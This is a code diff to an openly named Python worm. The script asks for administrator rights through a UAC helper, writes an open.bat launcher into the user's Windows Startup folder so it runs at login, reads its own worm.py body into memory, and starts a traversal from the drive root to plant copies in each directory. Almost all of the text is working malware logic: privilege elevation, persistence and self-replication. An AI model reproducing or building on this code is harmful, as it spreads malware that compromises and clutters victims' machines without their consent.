@@ -4,16 +4,7 @@ import UAC
 # IF UAC is not given, run.py will not be executed
 if not UAC.isUserAdmin():
     UAC.runAsAdmin()
-
-MEMORY_PER_RUN = 4000
-WORM_BIN = b""
-with open("worm.py", "rb") as infile:
-    info = infile.read(MEMORY_PER_RUN)
-        
-    if info == b"":
-        break
-    WORM_BIN += info
-
+    
 # To be executed upon login to OS
 USER_NAME = environ["USERNAME"]
 target_path = ospath.realpath(__file__)
@@ -21,8 +12,14 @@ bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\S
 
 with open(bat_path + '\\' + "open.bat", "w") as bat_file:
     bat_file.write(f'start "" {target_path}')
-
     
+# read worm.py binary info
+WORM_BIN = b""
+with open("worm.py", "rb") as infile:
+    info = infile.read()
+    WORM_BIN += info
+
+# start traversal at drive
 chdir('/')
 def traverse(path):
     # plant worm1.py in the absolute path currently on
